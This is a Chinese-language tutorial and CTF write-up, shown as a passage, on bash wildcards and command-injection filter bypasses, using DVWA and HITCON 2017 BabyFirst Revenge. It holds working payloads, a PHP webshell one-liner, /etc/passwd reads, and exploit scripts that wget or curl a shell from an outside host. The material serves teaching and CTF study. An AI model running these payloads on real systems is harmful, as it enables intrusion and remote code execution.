Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin _apt:x:102:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:103:107:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin [\u2026]\u7684\u4f7f\u7528 [...] \u5339\u914d\u65b9\u62ec\u53f7\u4e4b\u4e2d\u7684\u4efb\u610f\u4e00\u4e2a\u5b57\u7b26\uff0c\u6bd4\u5982 [aeiou] \u53ef\u4ee5\u5339\u914d\u4e94\u4e2a\u5143\u97f3\u5b57\u6bcd\u3002 # \u5b58\u5728\u6587\u4ef6 a.txt \u548c b.txt \u548c c.txt \u548c ab.txt $ ls [ab].txt a.txt b.txt $ ls *[ab].txt ab.txt a.txt b.txt $ ls [a-c].txt a.txt b.txt c.txt $ ls *[a-c].txt a.txt ab.txt abc.txt b.txt c.txt {\u2026}\u7684\u4f7f\u7528 {...} \u8868\u793a\u5339\u914d\u5927\u62ec\u53f7\u91cc\u9762\u7684\u6240\u6709\u6a21\u5f0f\uff0c\u6a21\u5f0f\u4e4b\u95f4\u4f7f\u7528\u9017\u53f7\u5206\u9694\u3002 $ echo d{a,e,i,u,o}g dag deg dig dug dog # \u5927\u62ec\u53f7\u53ef\u4ee5\u5d4c\u5957\u4f7f\u7528 $ echo {j{p,pe}g,png} jpg jpeg png # {start..end}\u5339\u914d\u8fde\u7eed\u5b57\u7b26 $ cat /f{0..z}ag NUAACTF{56723419231} {...} \u4e0e [...] \u6709\u4e00\u4e2a\u5f88\u91cd\u8981\u7684\u533a\u522b\u3002\u5982\u679c\u5339\u914d\u7684\u6587\u4ef6\u4e0d\u5b58\u5728\uff0c [...] \u4f1a\u5931\u53bb\u6a21\u5f0f\u7684\u529f\u80fd\uff0c\u53d8\u6210\u4e00\u4e2a\u5355\u7eaf\u7684\u5b57\u7b26\u4e32\uff0c\u800c {...} \u4f9d\u7136\u53ef\u4ee5\u5c55\u5f00\u3002 # \u4e0d\u5b58\u5728 a.txt \u548c b.txt $ ls [ab].txt ls: [ab].txt: No such file or directory $ ls {a,b}.txt ls: a.txt: No such file or directory ls: b.txt: No such file or directory Tips \u5728\u4f7f\u7528\u8fc7\u7a0b\u4e2d\u5e94\u8be5\u6ce8\u610f\uff1a \u901a\u914d\u7b26\u662f\u5148\u89e3\u91ca\uff0c\u518d\u6267\u884c\u3002 Bash \u63a5\u6536\u5230\u547d\u4ee4\u4ee5\u540e\uff0c\u53d1\u73b0\u91cc\u9762\u6709\u901a\u914d\u7b26\uff0c\u4f1a\u8fdb\u884c\u901a\u914d\u7b26\u6269\u5c55\uff0c\u7136\u540e\u518d\u6267\u884c\u547d\u4ee4\u3002 $ ls a*.txt ab.txt # \u4e0a\u9762\u547d\u4ee4\u7684\u6267\u884c\u8fc7\u7a0b\u662f\uff0cBash \u5148\u5c06a*.txt\u6269\u5c55\u6210ab.txt\uff0c\u7136\u540e\u518d\u6267\u884cls ab.txt\u3002 2. \u901a\u914d\u7b26\u4e0d\u5339\u914d\uff0c\u4f1a\u539f\u6837\u8f93\u51fa\u3002 Bash \u6269\u5c55\u901a\u914d\u7b26\u7684\u65f6\u5019\uff0c\u53d1\u73b0\u4e0d\u5b58\u5728\u5339\u914d\u7684\u6587\u4ef6\uff0c\u4f1a\u5c06\u901a\u914d\u7b26\u539f\u6837\u8f93\u51fa\u3002 $ ls *.csv ls: *.csv: No such file or directory # \u53e6\u5916\uff0c\u524d\u9762\u5df2\u7ecf\u8bf4\u8fc7\uff0c\u8fd9\u6761\u89c4\u5219\u5bf9{...}\u4e0d\u9002\u7528 3. \u53ea\u9002\u7528\u4e8e\u5355\u5c42\u8def\u5f84\u3002 \u4e0a\u9762\u6240\u6709\u901a\u914d\u7b26\u53ea\u5339\u914d\u5355\u5c42\u8def\u5f84\uff0c\u4e0d\u80fd\u8de8\u76ee\u5f55\u5339\u914d\uff0c\u5373\u65e0\u6cd5\u5339\u914d\u5b50\u76ee\u5f55\u91cc\u9762\u7684\u6587\u4ef6\u3002\u6216\u8005\u8bf4\uff0c ? \u6216 * \u8fd9\u6837\u7684\u901a\u914d\u7b26\uff0c\u4e0d\u80fd\u5339\u914d\u8def\u5f84\u5206\u9694\u7b26\uff08 / \uff09\u3002 \u5982\u679c\u8981\u5339\u914d\u5b50\u76ee\u5f55\u91cc\u9762\u7684\u6587\u4ef6\uff0c\u53ef\u4ee5\u5199\u6210\u4e0b\u9762\u8fd9\u6837\u3002 $ ls */*.txt 4. \u53ef\u7528\u4e8e\u6587\u4ef6\u540d\u3002 Bash \u5141\u8bb8\u6587\u4ef6\u540d\u4f7f\u7528\u901a\u914d\u7b26\u3002\u8fd9\u65f6\uff0c\u5f15\u7528\u6587\u4ef6\u540d\u7684\u65f6\u5019\uff0c\u9700\u8981\u628a\u6587\u4ef6\u540d\u653e\u5728\u5355\u5f15\u53f7\u91cc\u9762\u3002 $ touch 'fo*' $ ls fo* # \u4e0a\u9762\u4ee3\u7801\u521b\u5efa\u4e86\u4e00\u4e2afo*\u6587\u4ef6\uff0c\u8fd9\u65f6*\u5c31\u662f\u6587\u4ef6\u540d\u7684\u4e00\u90e8\u5206\u3002 \u8fd0\u7528 \u4ee5 DVWA \u4e3a\u4f8b Command Injection: low <?php if( isset( $_POST[ 'Submit' ] ) ) { // Get input $target = $_REQUEST[ 'ip' ]; // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec( 'ping ' . $target ); } else { // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"<pre>{$cmd}</pre>\"; } ?> \u8fd9\u91cc\u6ca1\u6709\u5bf9 ip \u8fdb\u884c\u8f93\u5165\u68c0\u6d4b\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 ;cmd \u7684\u65b9\u5f0f\u8fdb\u884c\u547d\u4ee4\u6ce8\u5165\u3002 Command Injection: medium <?php if( isset( $_POST[ 'Submit' ] ) ) { // Get input $target = $_REQUEST[ 'ip' ]; // Set blacklist $substitutions = array( '&&' => '', ';' => '', ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec( 'ping ' . $target ); } else { // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"<pre>{$cmd}</pre>\"; } ?> \u8fd9\u91cc\u4ec5\u4ec5\u53ea\u662f\u589e\u52a0\u4e86 && \u4e0e ; \u4e24\u4e2a\u7684\u8fc7\u6ee4\u3002\u7136\u800c\u6211\u4eec\u4ecd\u7136\u53ef\u4ee5\u4f7f\u7528 | \u6765\u8fdb\u884c\u7ed5\u8fc7\u3002 Command Injection: high <?php if( isset( $_POST[ 'Submit' ] ) ) { // Get input $target = trim($_REQUEST[ 'ip' ]); // Set blacklist $substitutions = array( '&' => '', ';' => '', '| ' => '', '-' => '', '$' => '', '(' => '', ')' => '', '`' => '', '||' => '', ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec( 'ping ' . $target ); } else { // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"<pre>{$cmd}</pre>\"; } ?> \u8fd9\u91cc\u4ed4\u7ec6\u89c2\u5bdf\uff0c\u5176\u5b9e | \u7ba1\u9053\u7b26\u8fd9\u91cc\u6709\u4e00\u4e2a\u7a7a\u683c\uff0c\u6240\u4ee5\u6211\u4eec medium \u7684 payload \u8fd8\u53ef\u4ee5\u7ee7\u7eed\u4f7f\u7528\uff0c\u4f46\u662f\u5982\u679c\u771f\u7684\u8fc7\u6ee4\u4e86 | \u600e\u4e48\u529e\u5462\u3002\u6211\u4eec\u5176\u5b9e\u8fd8\u53ef\u4ee5\u6293\u5305\u52a0\u5165 %0a \u6362\u884c\u7b26\u8fdb\u884c\u4e00\u4e2a\u7ed5\u8fc7\u3002\u4f7f\u7528 127.0.0.1 %0acat /etc/passwd \u8fdb\u884c\u7ed5\u8fc7 Command Injection: impossible <?php if( isset( $_POST[ 'Submit' ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $target = $_REQUEST[ 'ip' ]; $target = stripslashes( $target ); // Split the IP into 4 octects $octet = explode( \".\", $target ); // Check IF each octet is an integer if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) && ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) && ( sizeof( $octet ) == 4 ) ) { // If all 4 octets are int's put the IP back together. $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3]; // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec( 'ping ' . $target ); } else { // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"<pre>{$cmd}</pre>\"; } else { // Ops. Let the user name theres a mistake echo '<pre>ERROR: You have entered an invalid IP.</pre>'; } } // Generate Anti-CSRF token generateSessionToken(); ?> \u8fd9\u91cc\u5bf9 ip \u4ee5 . \u5206\u7ec4\u5e76\u68c0\u67e5\u4e86\u662f\u5426\u4e3a\u6570\u5b57\uff0c\u589e\u52a0\u4e86\u66f4\u591a\u7684\u8fc7\u6ee4\uff0c\u6240\u4ee5\u6ca1\u529e\u6cd5\u4f7f\u7528\u4e4b\u524d\u90a3\u4e9b trick \u6765\u8fdb\u884c\u7ed5\u8fc7\u4e86\u3002 \u5e38\u7528\u7ed5\u8fc7 \u547d\u4ee4\u5206\u9694\u4e0e\u6267\u884c\u591a\u6761\u547d\u4ee4 \u5728 Unix \u4e0a: %0a %0d ; & | $(shell_command) `shell_command` {shell_command,} \u5728 Windows \u4e0a\uff1a %0a & | %1a - \u4e00\u4e2a\u795e\u5947\u7684\u89d2\u8272\uff0c\u4f5c\u4e3a.bat\u6587\u4ef6\u4e2d\u7684\u547d\u4ee4\u5206\u9694\u7b26 \u4f8b\u5982\uff1a <?php $command = 'dir '.$_POST['dir']; $escaped_command = escapeshellcmd($command); var_dump($escaped_command); file_put_contents('out.bat',$escaped_command); system('out.bat'); ?> \u53ef\u4ee5\u5229\u7528 %1a \u7ed5\u8fc7 dir=../ %1a whoami \u6bd4\u8f83\u8001\u7684 php \u7248\u672c\uff0c\u59825.2.5\u53ca\u4e4b\u524d\u53ef\u4ee5\u901a\u8fc7\u8f93\u5165\u591a\u5b57\u8282\u6765\u7ed5\u8fc7\u3002\u73b0\u5728\u51e0\u4e4e\u89c1\u4e0d\u5230\u4e86\u3002 escapeshellcmd(\"echo \".chr(0xc0).\";id\"); //echo \u7e7a;id \u7a7a\u683c\u7ed5\u8fc7 \u4f7f\u7528 < \u6216\u8005 <> $ cat</flag flag{xxx} $ cat<>/flag flag{xxx} 2. \u4f7f\u7528 IFS \u6216\u8005 $ cat$IFS$9/flag flag{xxx} $ cat${IFS}/flag flag{xxx} $ cat$IFS/flag flag{xxx} 3. \u5728 url \u7684\u7f16\u7801\u7ed5\u8fc7 \u8fd9\u91cc\u6211 fuzz \u4e86\u4e00\u4e0b\uff0c Linux bash \u53ef\u4ee5\u4f7f\u7528 %20(space) \u3001 %09(tab) \u3001 %3c(<) \u4ee5\u53ca + \u6765\u7ed5\u8fc7 4. \u82b1\u62ec\u53f7\u62d3\u5c55 {OS_COMMAND,ARGUMENT} \u5728 Linux bash \u4e2d\u8fd8\u53ef\u4ee5\u4f7f\u7528 {cat,/etc/passwd} \u6765\u7ed5\u8fc7 5. \u53d8\u91cf\u63a7\u5236 $ X=$'cat\\x20/flag'&&$X flag{xxx} $ X=$'cat\\x09/flag'&&$X flag{xxx} #\u8fd9\u91cc\\x3c\u4e0d\u53ef\u4ee5 6. \u91c7\u7528 [[email protected]](https://blog.zeddyu.info/cdn-cgi/l/email-protection) \u7ed5\u8fc7 $ c[[email protected]](https://blog.zeddyu.info/cdn-cgi/l/email-protection)at /fl[[email protected]](https://blog.zeddyu.info/cdn-cgi/l/email-protection)ag flag{xxx} $ echo i[[email protected]](https://blog.zeddyu.info/cdn-cgi/l/email-protection)d id $ echo i[[email protected]](https://blog.zeddyu.info/cdn-cgi/l/email-protection)d|$0 uid=0(root) gid=0(root) groups=0(root) \u9ed1\u540d\u5355\u7ed5\u8fc7 \u91c7\u7528\u53d8\u91cf $ a=l;b=s;$a$b bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var $ a=c;b=at;c=flag;$a$b $c flag{xxx} 2. \u7f16\u7801\u7ed5\u8fc7 $ echo \"Y2F0IC9mbGFn\"|base64 -d|bash flag{xxx} #base64_endcode(\"cat /flag\") => Y2F0IC9mbGFn #base64\u53ef\u80fd\u4f1a\u51fa\u73b0/ $ echo \"636174202f666c6167\" | xxd -r -p|bash #hex flag{xxx} $ $(printf \"\\154\\163\") #oct bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var $ $(cat /flag) bash: flag{xxx}: \u672a\u627e\u5230\u547d\u4ee4 $ $(printf \"\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67\") flag{xxx} $ {printf,\"\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67\"}|$0 flag{xxx} #\u53ef\u4ee5\u901a\u8fc7\u8fd9\u6837\u6765\u5199webshell,\u5185\u5bb9\u4e3a<?php @eval($_POST['c']);?> $ {printf,\"\\74\\77\\160\\150\\160\\40\\100\\145\\166\\141\\154\\50\\44\\137\\120\\117\\123\\124\\133\\47\\143\\47\\135\\51\\73\\77\\76\"} >> 1.php 3. \u5355\u5f15\u53f7\u53cc\u5f15\u53f7 $ c\"a\"t /f''l'a'g flag{xxx} 4. \u53cd\u659c\u7ebf $ c\\a\\t /f\\l\\ag flag{xxx} 5. \u5229\u7528\u5df2\u7ecf\u5b58\u5728\u7684\u8d44\u6e90 $ echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin $ echo $PATH| cut -c 1 / 6. \u5229\u7528\u4e00\u4e9b\u5df2\u6709\u5b57\u7b26 * ${PS2} \u5bf9\u5e94\u5b57\u7b26 `>` * ${PS4} \u5bf9\u5e94\u5b57\u7b26 `+` * ${IFS} \u5bf9\u5e94 \u5185\u90e8\u5b57\u6bb5\u5206\u9694\u7b26 * ${9} \u5bf9\u5e94 \u7a7a\u5b57\u7b26\u4e32 \u4e3e\u4e2a\u4f8b\u5b50 \u77ed\u547d\u4ee4\u6267\u884c \u9996\u5148\u6309\u7167\u524d\u9762\u7684 > \u7684\u7528\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u6709\u6807\u51c6\u8f93\u51fa\u53ef\u4ee5\u8f93\u51fa\u5230\u6587\u4ef6\uff0c\u6240\u4ee5 \u8fd9\u91cc\u6211\u4eec\u6709\u4e24\u79cd\u6784\u9020\u65b9\u5f0f: \u53ea\u7528 \\ \u5206\u884c\u8f93\u5165\uff0c\u8fd9\u4e2a\u4f18\u70b9\u662f\u53ef\u4ee5\u4e0d\u7528\u8003\u8651\u65f6\u95f4\u987a\u5e8f\uff0c\u76f4\u63a5\u7528 ls>a \u8f93\u51fa\u5230 a \u6587\u4ef6\uff0c\u8fd9\u91cc\u53ef\u80fd\u6709\u4e00\u70b9\u8bef\u89e3\uff0c\u8fd9\u91cc\u662f\u8f93\u5165 $ >ec\\ ho\\ \\ 1 #\u8fd9\u4e2a\u65b9\u6cd5\u524d\u9762\u4e0d\u9700\u8981\u52a0>\uff0c\u6700\u540e\u7528\\\u8f6c\u4e49\u7a7a\u683c \u4f7f\u7528 \\\\ \uff0c\u8fd9\u79cd\u65b9\u6cd5\u662f\u5229\u7528 \\ \u6765\u62fc\u63a5\u5b57\u7b26\u4e32\uff0c\u5176\u4e2d\u524d\u4e00\u4e2a \\ \u662f\u7528\u6765\u8f6c\u4e49\u540e\u4e00\u4e2a \\ \u7684\u3002\u8fd9\u91cc\u9700\u8981\u8003\u8651\u65f6\u95f4\u987a\u5e8f\uff0c\u9700\u8981\u9006\u5e8f\u6765\u521b\u5efa\u6587\u4ef6\u3002 Example 1 \u4e03\u5b57\u7ed5\u8fc7 \u8fd9\u91cc\u662f\u4e2ap\u725b\u51fa\u7684\u9898 <?php if(strlen($_GET[1])<8){ echo shell_exec($_GET[1]); } ?> \u6211\u4eec\u53ef\u4ee5\u5206\u522b\u901a\u8fc7\u53d1\u9001 ?1=>hp ?1=>ell.p\\\\ ?1=>\\ sh\\\\ ?1=>\\ -O\\\\ ?1=>com\\\\ ?1=>x.\\\\ ?1=>\\ xx\\\\ ?1=>wget\\\\ ?1=ls -t>a ?1=sh a \u4e5f\u5c31\u662f\u6211\u4eec\u4e0a\u8ff0\u7684\u7b2c\u4e8c\u4e2a\u65b9\u6cd5\u5199\u5165\u4e00\u4e2a a \u6587\u4ef6\uff0c\u5176\u4e2d xxx.com \u53ef\u4ee5\u66ff\u6362\u4e3a\u81ea\u5df1\u7684\u57df\u540d\uff0c\u4f46\u662f\u8fd9\u91cc\u8981\u6ce8\u610f\uff0c\u4e0d\u80fd\u4ee5 . \u5f00\u5934\uff0c\u56e0\u4e3a ls -t>a \u65e0\u6cd5\u5c06\u9690\u85cf\u6587\u4ef6\u540d\u5199\u5165 a \u3002 \u8d34\u4e00\u4e0bp\u725b\u7684\u811a\u672c #!/usr/bin/python3 #-*- coding: utf-8 -*- import requests def GetShell(): url = \"http://192.168.56.129/shell.php?1=\" fileNames = [\"1.php\",\"-O\\ \\\\\",\"cn\\ \\\\\",\"\\ a.\\\\\",\"wget\\\\\"] # linux\u521b\u5efa\u4e2d\u95f4\u6709\u7a7a\u683c\u7684\u6587\u4ef6\u540d\uff0c\u9700\u8981\u8f6c\u4e49\uff0c\u6240\u4ee5\u6709\u8bf7\u6c42\"cn\\ \\\\\" # \u53ef\u4ee5\u4fee\u6539hosts\u6587\u4ef6\uff0c\u8ba9a.cn\u6307\u5411\u4e00\u4e2a\u81ea\u5df1\u7684\u670d\u52a1\u5668\u3002 # \u5728a.cn \u7684\u6839\u76ee\u5f55\u4e0b\u521b\u5efaindex.html \uff0c\u5185\u5bb9\u662f\u4e00\u4e2aphp shell for fileName in fileNames: createFileUrl = url+\">\"+fileName print createFileUrl requests.get(createFileUrl) getShUrl = url + \"ls -t>1\" print getShUrl requests.get(getShUrl) getShellUrl = url + \"sh 1\" print getShellUrl requests.get(getShellUrl) shellUrl = \"http://192.168.56.129/1.php\" response = requests.get(shellUrl) if response.status_code == 200: print \"[*] Get shell !\" else : print \"[*] fail!\" if __name__ == \"__main__\": GetShell() Example 2 \u4e94\u5b57\u7ed5\u8fc7 [HITCON CTF 2017-BabyFirst Revenge] \u6e90\u7801: <?php $sandbox = '/www/sandbox/' . md5(\"orange\" . $_SERVER['REMOTE_ADDR']); @mkdir($sandbox); @chdir($sandbox); if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 5) { @exec($_GET['cmd']); } else if (isset($_GET['reset'])) { @exec('/bin/rm -rf ' . $sandbox); } highlight_file(__FILE__); \u8fd9\u91cc\u9700\u8981\u6211\u4eec\u6ce8\u610f\u7684\u662f cmd <= 5 \uff0c\u6240\u4ee5\u6211\u4eec\u5c31\u4e0d\u80fd\u5728\u4f7f\u7528 ls -t>a \u3002 \u4f46\u662f\u6211\u4eec\u8fd8\u662f\u53ef\u4ee5\u901a\u8fc7\u6bd4\u8f83\u5de7\u5999\u7684\u6784\u9020\u6765\u5b9e\u73b0 ls -t>a \u8fd9\u4e48\u4e00\u4e2a\u64cd\u4f5c\u7684\u3002\u53ef\u4ee5\u5148\u901a\u8fc7\u628a ls -t>a \u8fd9\u6837\u62c6\u5206\u6210\u51e0\u6bb5\u5199\u5165\u5230 _ \u6587\u4ef6\u5b58\u653e\u3002 \u4ece\u56fe\u4e2d\u6211\u4eec\u5c31\u53ef\u4ee5\u770b\u5230 _ \u91cc\u9762\u7684\u5185\u5bb9\uff0c\u7b2c\u4e00\u884c\u65e0\u6548\u547d\u4ee4\uff0c2-5\u884c\u56e0\u4e3a\u672b\u5c3e\u6709 \\ \u8fde\u63a5\u5b57\u7b26\u7684\u5b58\u5728\u6240\u4ee5\u53ef\u4ee5\u8fde\u63a5\u5b57\u7b26\u4e32\u5f62\u6210 ls -t>g \uff0c\u6700\u540e\u4e00\u884c\u6267\u884c ls \u3002\u6240\u4ee5 sh _ \u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u5f53\u524d\u76ee\u5f55 ls -t>g \u7684\u6548\u679c\u3002\u8fbe\u5230\u4e0e Example 1 \u4e00\u81f4\u7684\u6548\u679c\uff0c\u5176\u4ed6\u6b65\u9aa4\u4e0e Example 1 \u7c7b\u4f3c\uff0c\u5c31\u4e0d\u518d\u8d58\u8ff0\u4e86\u3002\u4e0b\u9762\u7ed9\u51fa Orange \u7684 exp import requests from time import sleep from urllib import quote payload = [ # generate `ls -t>g` file '>ls\\\\', 'ls>_', '>\\ \\\\', '>-t\\\\', '>\\>g', 'ls>>_', # generate `curl orange.tw.tw>python` # curl shell.0xb.pw|python '>on', '>th\\\\', '>py\\\\', '>\\|\\\\', '>pw\\\\', '>x.\\\\', '>xx\\\\', '>l.\\\\', '>el\\\\', '>sh\\\\', '>\\ \\\\', '>rl\\\\', '>cu\\\\', # exec 'sh _', 'sh g', ] # r = requests.get('http://localhost/tmp/?reset=1') for i in payload: assert len(i) <= 5 r = requests.get('http://localhost/tmp/?cmd=' + quote(i) ) print i sleep(0.2) \u76f8\u5173Writeup: HITCON CTF 2017-BabyFirst Revenge-writeup HITCON CTF 2017-BabyFirst Revenge-writeup (Via curl) HITCON 2017 CTF BabyFirst Revenge HITCON CTF 2017 - BabyFirst Revenge (172 pts.) Hitcon CTF 2017 - Baby Revenge Hitcon CTF 2017 Quals: Baby First Revenge (web 172) (Via xxd) HITCON CTF 2017 BabyFirst Revenge & v2 writeup BabyFirst-Revenge-HITCOIN-2017-QUALS by @n4p5ter Example 3 \u56db\u5b57\u7ed5\u8fc7 [HITCON 2017 BabyFirst Revenge v2] \u6e90\u7801\uff1a <?php $sandbox = '/www/sandbox/' . md5(\"orange\" . $_SERVER['REMOTE_ADDR']); @mkdir($sandbox); @chdir($sandbox); if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 4) { @exec($_GET['cmd']); } else if (isset($_GET['reset'])) { @exec('/bin/rm -rf ' . $sandbox); } highlight_file(__FILE__); ?> \u8fd9\u9898\u76f8\u6bd4\u4e4b\u524d\u53c8\u96be\u4e86\u4e00\u70b9\uff0c\u8fd9\u6b21\u662f cmd <= 4 \uff0c\u4f46\u662f\u539f\u7406\u8fd8\u662f\u4e00\u6837\u7684\u3002\u6211\u4eec\u8981\u5904\u7406\u7684\u95ee\u9898\u8fd8\u662f ls -t>g \u8fd9\u4e48\u4e00\u4e2a\u95ee\u9898\u3002\u7136\u540e\u56e0\u4e3a\u957f\u5ea6\u9650\u5236\uff0c\u5982\u679c\u6211\u4eec\u8fd8\u7528 \\\\ \u4f5c\u4e3a\u5b57\u7b26\u4e32\u8fde\u63a5\u7684\u8bdd\uff0c\u53ea\u5269\u4e0b\u4e24\u4e2a\u5b57\u7b26\uff0c\u52a0\u4e0a\u6700\u5f00\u59cb\u5fc5\u987b\u8981\u7528 > \u521b\u5efa\u6587\u4ef6\uff0c\u6240\u4ee5\u53ea\u5269\u4e0b\u4e00\u4e2a\u53ef\u63a7\u5b57\u7b26\u3002\u6240\u4ee5\u78b0\u5230\u9700\u8981\u8f6c\u4e49\u7a7a\u683c\u8fd9\u79cd\u5730\u65b9\u4f8b\u5982 Exmaple 2 \u4e2d\u7684 >\\ \\\\ \u8fd9\u91cc\u5c31\u4e0d\u80fd\u518d\u4f7f\u7528\u4e86\u3002\u4f46\u662f\u6211\u4eec\u8fd9\u91cc\u518d\u63d0\u4e00\u4e2a trick * \u76f8\u5f53\u4e8e $(dir *) ,\u6240\u4ee5\u8bf4\u5982\u679c\u6587\u4ef6\u540d\u5982\u679c\u662f\u547d\u4ee4\u7684\u8bdd\u5c31\u4f1a\u8fd4\u56de\u6267\u884c\u7684\u7ed3\u679c,\u4e4b\u540e\u7684\u4f5c\u4e3a\u53c2\u6570\u4f20\u5165\u3002\u4f8b\u5982\uff1a \u6240\u4ee5\u56de\u5230\u9898\u76ee\uff0c\u5982\u679c\u6309\u7167\u987a\u5e8f\u53bb\u521b\u5efa\u6587\u4ef6\uff0c\u6211\u4eec\u4f1a\u53d1\u73b0\u5982\u679c\u76f4\u63a5\u7528 * \u53bb\u6267\u884c\u7684\u8bdd\uff0c\u53d1\u73b0\u5e76\u4e0d\u53ef\u4ee5\uff0c\u56e0\u4e3a\u6309\u7167 dir \u7684\u6587\u4ef6\u6392\u5e8f\uff0c -t \u4e5f\u662f\u6392\u5728\u6700\u524d\u9762\u3002 \u6240\u4ee5\u6211\u4eec\u8fd8\u9700\u8981\u53c2\u8003\u4e00\u4e0b alphabetical \u6765\u6392\u5e8f\uff0c\u8fd9\u91cc\u5c31\u4e0d\u8981\u7528 Docker \u6765\u505a\u4e86\uff0c\u56e0\u4e3a busybox \u91cc\u9762\u4e00\u4e9b\u4e1c\u897f\u8fd8\u662f\u8ddf\u771f\u5b9e\u73af\u5883\u4f18\u70b9\u533a\u522b\u7684\u3002 \u6240\u4ee5\u5982\u679c\u6211\u4eec\u9700\u8981\u8fd0\u7528 - \u5b57\u7b26\u7684\u8bdd\uff0c\u4ed6\u4f1a\u6392\u5728\u6700\u524d\u9762\uff0c\u8fd9\u91cc\u5c31\u6bd4\u8f83\u5751\u4e86\u3002\u6240\u4ee5\u6211\u4eec\u9700\u8981\u60f3\u4e2a\u529e\u6cd5\u628a -t \u7f6e\u4e8e\u540e\u9762\u3002 \u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 t- \u8fd9\u79cd\u9006\u5e8f\u7684\u6a21\u5f0f\u628a t \u653e\u5230\u524d\u9762\u6765\uff0c\u5c31\u53ef\u4ee5\u6bd4\u8f83\u6b63\u5e38\u7684\u6392\u5e8f\u4e86\u3002 \u9006\u5e8f\u7684\u547d\u4ee4\u6211\u4eec\u53ef\u4ee5\u7528 rev \u6765\u5b9e\u73b0\uff0c\u53e6\u5916\u6211\u4eec\u8fd8\u9700\u8981\u4e00\u4e2a\u5b57\u6bcd\u6bd4\u8f83\u9760\u524d\u7684\u547d\u4ee4\u6765\u5c55\u793a\u5f53\u524d\u76ee\u5f55\uff0c\u6211\u4eec\u53ef\u4ee5\u91c7\u7528 dir \u6765\u5c55\u793a\u5f53\u524d\u76ee\u5f55\uff0c\u540c\u65f6 d \u5b57\u6bcd\u4e5f\u6bd4\u8f83\u9760\u524d\uff0c\u4e0d\u8981\u50cf ls \u7279\u522b\u8003\u8651\u6392\u5e8f\u7684\u95ee\u9898\u3002\u6240\u4ee5\u6211\u4eec\u5927\u6982\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e48\u4e00\u4e2a\u5f62\u5f0f\u53bb\u6784\u9020 ls -t>g \u8fd9\u91cc\u53ef\u80fd\u6709\u51e0\u4e2a\u8ba9\u5927\u5bb6\u6bd4\u8f83\u7591\u60d1\u7684\u5730\u65b9\uff0c\u6bd4\u5982\u4e3a\u4ec0\u4e48\u662f >ht- \uff0c\u4e2a\u4eba\u7406\u89e3\u662f\u56e0\u4e3a ls \u9006\u5e8f\u662f sl \uff0c s \u662f\u6392\u5728 t \u524d\u7684\uff0c\u5982\u679c\u4e0d\u52a0 h \uff0c t- \u4f1a\u5728 sl \u4e4b\u540e\uff0c\u800c\u4e14 ls -th \u4e0e ls -t \u6548\u679c\u662f\u4e00\u6837\u7684\uff0c\u7136\u540e\u6211\u4eec\u518d\u627e\u4e00\u4e2a h \u4e4b\u524d\u7684\u5b57\u6bcd\u505a\u8f93\u51fa\u6587\u4ef6\u5c31\u53ef\u4ee5\u4e86\u3002\u8fd8\u6709\u4e00\u4e2a\u5730\u65b9\u5c31\u662f *v>x \uff0c\u4e4b\u524d\u6211\u4eec\u8bb2\u8fc7\u4e86\u901a\u914d\u7b26\u4ee5\u53ca * \u7684\u4f5c\u7528\uff0c\u8fd9\u91cc *v \u5c31\u76f8\u5f53\u4e8e $(dir *v)>x \uff0c dir *v \u8fd4\u56de\u7684\u5c31\u662f\u7ed3\u5c3e\u4e3a v \u7684\u6587\u4ef6\uff0c\u8fd9\u91cc\u5c31\u662f rev \u4e0e v \u4e24\u4e2a\u6587\u4ef6\uff0c\u5982\u679c\u53ea\u6709\u76f8\u5f53\u4e8e\u5148\u628a v \u6587\u4ef6\u5185\u5bb9\u8fdb\u884c\u9006\u5e8f\uff0c\u800c\u540e\u518d\u8f93\u5165\u5230 x \u6587\u4ef6\uff0c\u8fd9\u6837\u6574\u4e2a ls -t>g \u7684\u547d\u4ee4\u62fc\u51d1\u5c31\u5b8c\u6210\u4e86\uff0c\u63a5\u7740\u65b9\u6cd5\u5c31\u6709\u5f88\u591a\u79cd\u4e86\uff0c\u6bd4\u8f83\u7b80\u5355\u7684\u5c31\u662f\u76f4\u63a5 wget \u6216\u8005 curl \u4e00\u4e2a webshell \u5230\u670d\u52a1\u5668\u4e0a\u5c31\u597d\u4e86\uff0c\u5c31\u4e0d\u518d\u8d58\u8ff0\u4e86\u3002 \u518d\u7ed9\u4e00\u4e2a Orange \u7684 exp import requests from 